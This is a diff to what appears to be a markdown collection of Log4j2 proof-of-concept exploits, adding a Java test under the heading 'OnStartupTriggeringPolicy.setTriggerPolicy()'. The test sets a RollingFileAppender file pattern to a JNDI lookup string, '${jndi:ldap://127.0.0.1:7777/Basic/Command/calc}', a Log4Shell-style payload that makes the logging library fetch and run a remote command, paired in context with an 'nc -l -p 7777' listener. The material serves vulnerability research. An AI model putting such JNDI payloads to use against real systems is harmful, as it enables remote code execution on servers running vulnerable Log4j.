@@ -104,6 +104,34 @@ nc -l -p 7777
     }
 ```
 
+**OnStartupTriggeringPolicy.setTriggerPolicy()**
+
+```
+ @Test
+    public void setTriggerPolicyOnStartupTriggeringPolicyTest(){
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
+                .withFileName("app.log")
+                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+                .setLayout(layout)
+                .withAppend(true)
+                .setName("RollingFile")
+                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "false", "0 * * * * ?"))
+                .withStrategy(DefaultRolloverStrategy.newBuilder()
+                        .withMax(String.valueOf(3))
+                        .withConfig(new DefaultConfiguration())
+                        .withFileIndex("min")
+                        .build())
+                .build();
+
+        appender.getManager().setTriggeringPolicy(OnStartupTriggeringPolicy.createPolicy(1));
+    }
+```
+
 ## Pocs for Context Tree ##
 
 **LogManager.getContext()**
